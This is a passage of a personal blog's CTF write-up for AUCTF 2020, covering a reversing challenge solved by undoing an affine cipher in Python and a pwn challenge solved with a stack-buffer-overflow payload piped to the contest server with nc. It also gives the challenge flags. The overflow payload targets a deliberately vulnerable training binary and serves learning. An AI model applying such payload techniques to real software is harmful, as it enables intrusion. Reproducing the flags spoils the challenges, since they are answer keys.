+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc challenges.auctf.com 30004
+<span class="go">Give me a key!
+</span><span class="gp">75&lt;"72"%5($</span>.<span class="s2">"0(G
+</span><span class="go">auctf{that_w@s_2_ezy_29302}
+</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">auctf{that_w@s_2_ezy_29302}</code></p><hr /><h2 id="dont-break-me">Don’t Break Me</h2><h4 id="reversing-3">Reversing</h4><h3 id="description-3">Description</h3><blockquote><p><strong>I’ve been working on my anti-reversing lately. See if you can get this flag!<br /><br /> Connect at challenges.auctf.com 30005</strong></p></blockquote><h3 id="solution-3">Solution</h3><p>Alright, with <code class="language-plaintext highlighter-rouge">file</code> command we know it’s 32-bit ELF file, dynamically linked and not stripped .. and with <code class="language-plaintext highlighter-rouge">strings</code> command there’s nothing interesting</p><p>Now it’s time for radare2:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>r2 <span class="nt">-AA</span> dont-break-me
+<span class="gp">[0x000010e0]&gt;</span><span class="w"> </span>afl
+<span class="c">..
+</span><span class="go">0x000015a1    7 224          sym.decrypt
+0x0000138a    6 102          sym.get_string
+0x000014cf    7 210          sym.encrypt
+0x00001681    6 117          sym.inverse
+0x00001272    4 280          main
+</span><span class="c">..
+</span></pre></table></code></div></div><p>Those function names sound interesting let’s start with main() function:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/break/break1.png" alt="r2 screenshot" /></div><p>It seems that the program takes the user input then removes the newline character at the end, then pushes it as an argument to encrypt() function and put the result in s2 variable .. after that it allocates a new memory using calloc() built-in function and returns the address to s1 which is passed to get_string() function as an argument to load a string .. afterwards there’s a compare so s1 MUST be equal s2</p><p>So overall we need to reverse that as follows:</p><ul><li>See the get_string() function and get the string which is loaded to s1<li>Decrypt that string using decrypt() function<li>Input the result in order to get the flag</ul><p>So far so good .. we’ll start with decompiling get_string() function using IDA pro:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/break/break2.png" alt="IDA pro screenshot" /></div><p>It’s clear that it iterates from 0 to 31 and with this if condition it only loads the even indexed characters (e.x. 0, 2, 4, …) from blah variable <strong>backwoards</strong> in the a1 variable</p><p>And this is the value of blah variable:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/break/break3.png" alt="IDA pro screenshot" /></div><p>Which is <code class="language-plaintext highlighter-rouge">XAPRMXCSBCEDISBVXISXWERJRWSZARSQ</code></p><p>Next, the decrypt() function:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/break/break4.png" alt="IDA pro screenshot" /></div><p>Clearly, it takes the user input string with two argument which, from analysing the code, are 12, 17 consecutively then iterates through each character and decrypt it using a formula which appears to be the <a href="https://en.wikipedia.org/wiki/Affine_cipher">Affine Cipher</a></p><p>Finally the inverse() function:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/break/break5.png" alt="IDA pro screenshot" /></div><p>Simple enough! .. Now by combining our understanding of the previous functions i came up with this python script which is equivalent of all we said</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">get_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">u</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">u</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">result</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">u</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+    <span class="n">result</span><span class="p">.</span><span class="n">reverse</span><span class="p">()</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">inverse</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">26</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">i</span> <span class="o">*</span> <span class="n">a</span> <span class="o">%</span> <span class="mi">26</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">n</span> <span class="o">=</span> <span class="n">i</span>
+
+    <span class="k">return</span> <span class="n">n</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
+    <span class="n">x</span> <span class="o">=</span> <span class="s">""</span>
+
+    <span class="n">inv</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+        <span class="c1"># check if the character is a space
+</span>        <span class="k">if</span> <span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="mi">32</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">+=</span> <span class="n">i</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">inv</span> <span class="o">*</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">65</span> <span class="o">-</span> <span class="n">k</span><span class="p">)</span><span class="o">%</span><span class="mi">26</span> <span class="o">+</span> <span class="mi">65</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">x</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="s">"XAPRMXCSBCEDISBVXISXWERJRWSZARSQ"</span>
+<span class="n">a</span> <span class="o">=</span> <span class="mi">17</span>
+<span class="n">k</span> <span class="o">=</span> <span class="mi">12</span>
+
+<span class="n">secret</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="n">secret</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</pre></table></code></div></div><p>Now by running this script it should give us the key:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 decrypt.py
+<span class="go">IKILLWITHMYHEART
+</span></pre></table></code></div></div><p>Now connecting to the server:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc challenges.auctf.com 30005
+<span class="go">54 68 65 20 6d 61 6e 20 69 6e 20 62 6c 61 63 6b 20 66 6c 65 64 20 61 63 72 6f 73 73 20 74 68 65 20 64 65 73 65 72 74 2c 20 61 6e 64 20 74 68 65 20 67 75 6e 73 6c 69 6e 67 65 72 20 66 6f 6c 6c 6f 77 65 64 2e
+Input: IKILLWITHMYHEART
+auctf{static_or_dyn@mIc?_12923}
+</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">auctf{static_or_dyn@mIc?_12923}</code></p><hr /><h2 id="thanksgiving-dinner">Thanksgiving Dinner</h2><h4 id="pwn">Pwn</h4><h3 id="description-4">Description</h3><blockquote><p><strong>I just ate a huge dinner. I can barley eat anymore… so please don’t give me too much!<br /> nc challenges.auctf.com 30011<br /> Note: ASLR is disabled for this challenge</strong></p></blockquote><h3 id="solution-4">Solution</h3><p>Nice! by doing <code class="language-plaintext highlighter-rouge">file</code> command we know it’s 32-bit ELF file, dynamically linked and not stripped and with <code class="language-plaintext highlighter-rouge">strings</code> command nothing really interesting</p><p>And with radare2:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>r2 <span class="nt">-AA</span> turkey
+<span class="gp">[0x000010c0]&gt;</span><span class="w"> </span>afl
+<span class="c">..
+</span><span class="go">0x000011f9    1 87           main
+0x00001250    7 198          sym.vulnerable
+</span><span class="c">..
+</span></pre></table></code></div></div><p>Those are interesting functions .. the main only puts a text and then calls vulnerable() function which makes 5 checks if they’re all true it prints out the flag!:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/thanksgiving/thanksgiving1.png" alt="r2 screenshot" /></div><p>We go to gdb-peda for a better memory examine and debugging:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">gdb-peda$</span><span class="w"> </span><span class="nb">set </span>disassembly-flavor intel
+<span class="gp">gdb-peda$</span><span class="w"> </span>disass vulnerable
+</pre></table></code></div></div><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/thanksgiving/thanksgiving2.png" alt="gdb-peda screenshot" /></div><p>We see fgets length is 0x24 which is 36, so we put a breakpoint after fgets that will allow us to examine the memory right after we enter the input.</p><p>And by running the file and enters <code class="language-plaintext highlighter-rouge">AAAA</code> as input:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/thanksgiving/thanksgiving3.png" alt="gdb-peda screenshot" /></div><p>We can see that eax register is pointing to 0xbffff14c address and by examining the memory at this location and all the addresses in the comparisons:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/thanksgiving/thanksgiving4.png" alt="gdb-peda screenshot" /></div><p>GREAT! Now we can overwrite those values to pass the checks .. and these are the 5 checks:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/thanksgiving/thanksgiving5.png" alt="gdb-peda screenshot" /></div><ul><li><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://placehold.it/15/ff0000/000000?text=+" alt="Red" /> 0xbffff16c MUST EQUAL 0x1337<li><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://placehold.it/15/00ff00/000000?text=+" alt="Green" /> 0xbffff168 MUST BE LESS THAN 0xffffffec (= -20)<li><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://placehold.it/15/ffff00/000000?text=+" alt="Yellow" /> 0xbffff160 MUST NOT EQUAL 0x14<li><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://placehold.it/15/ff00ff/000000?text=+" alt="Pink" /> 0xbffff164 MUST EQUAL 0x667463<li><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://placehold.it/15/ff6600/000000?text=+" alt="Orange" /> 0xbffff15c MUST EQUAL 0x2a</ul><p>Now our payload is:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p32</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x2a</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x667463</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffec</span> <span class="o">-</span> <span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
+<span class="s">'AAAAAAAAAAAAAAAA*</span><span class="se">\x00\x00\x00</span><span class="s"> </span><span class="se">\x00\x00\x00</span><span class="s">ctf</span><span class="se">\x00\xe2\xff\xff\xff</span><span class="s">7</span><span class="se">\x13\x00\x00</span><span class="s">'</span>
+</pre></table></code></div></div><p>Now we can pipe it to the server:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python <span class="nt">-c</span> <span class="s2">"print 'AAAAAAAAAAAAAAAA*</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00 </span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00ctf</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff7</span><span class="se">\x</span><span class="s2">13</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00'"</span> | nc challenges.auctf.com 30011
+<span class="go">Hi!
+Welcome to my program... it's a little buggy...
+Hey I heard you are searching for flags! Well I've got one. :)
+Here you can have part of it!
+auctf{
+
+Sorry that's all I got!
+
+Wait... you aren't supposed to be here!!
+auctf{I_s@id_1_w@s_fu11!}
+</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">auctf{I_s@id_1_w@s_fu11!}</code></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/writeups/" class="post-tag no-text-decoration" >writeups</a> <a href="/tags/reverse-engineering/" class="post-tag no-text-decoration" >reverse-engineering</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=AUCTF 2020 - T1m3-m4ch1n3&url=https://T1m3M.github.io/posts/auctf-2020/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=AUCTF 2020 - T1m3-m4ch1n3&u=https://T1m3M.github.io/posts/auctf-2020/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=AUCTF 2020 - T1m3-m4ch1n3&url=https://T1m3M.github.io/posts/auctf-2020/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://T1m3M.github.io/posts/auctf-2020/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/MIPS-cheatsheet/">MIPS cheatsheet</a><li><a href="/posts/RE/">What is Reverse Engineering? | ما هى الهندسة العكسية؟</a><li><a href="/posts/cybertalents-cairo-university-2019-ctf/">CyberTalents Cairo University CTF 2019</a><li><a href="/posts/auctf-2020/">AUCTF 2020</a><li><a href="/posts/angstrom-ctf-2020/">Angstrom CTF 2020</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/reverse-engineering/">reverse engineering</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">binary exploitation</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/low-level/">low level</a> <a class="post-tag" href="/tags/malware-analysis/">malware analysis</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cybertalents-cairo-university-2019-ctf/"><div class="card-body"> <span class="timeago small" > Nov 30, 2020 <i class="unloaded">2020-11-30T21:40:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CyberTalents Cairo University CTF 2019</h3><div class="text-muted small"><p> It was the first year for CyberTalents’s Cybersecurity CTF Competition at Cairo University and was also my first time to participate in a real-life CTF! NOTE: the descriptions of the challenges a...</p></div></div></a></div><div class="card"> <a href="/posts/angstrom-ctf-2020/"><div class="card-body"> <span class="timeago small" > Dec 1, 2020 <i class="unloaded">2020-12-01T03:20:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Angstrom CTF 2020</h3><div class="text-muted small"><p> ångstromCTF 2020 was really a great competition and we as P1rates team enjoyed it and learned a lot, Here’s my writeup about what i solved. Challenges Title Category S...</p></div></div></a></div><div class="card"> <a href="/posts/RE/"><div class="card-body"> <span class="timeago small" > Jan 3 <i class="unloaded">2021-01-03T10:38:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>What is Reverse Engineering? | ما هى الهندسة العكسية؟</h3><div class="text-muted small"><p> ملحوظة: المقال باللغتين العربية والإنجليزية لمساعدة أكبر قدر ممكن من الناس ونشر العلم 💜 NOTE: This article is in both Arabic and English to help as many people as possible and spread the knowled...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/angstrom-ctf-2020/" class="btn btn-outline-primary"><p>Angstrom CTF 2020</p></a> <a href="/posts/RE/" class="btn btn-outline-primary"><p>What is Reverse Engineering? | ما هى الهندسة العكسية؟</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/T1m3M">Abdelrahman Nasr</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/reverse-engineering/">reverse engineering</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">binary exploitation</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/low-level/">low level</a> <a class="post-tag" href="/tags/malware-analysis/">malware analysis</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://T1m3M.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-1WZELSLYX1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-1WZELSLYX1'); </script>
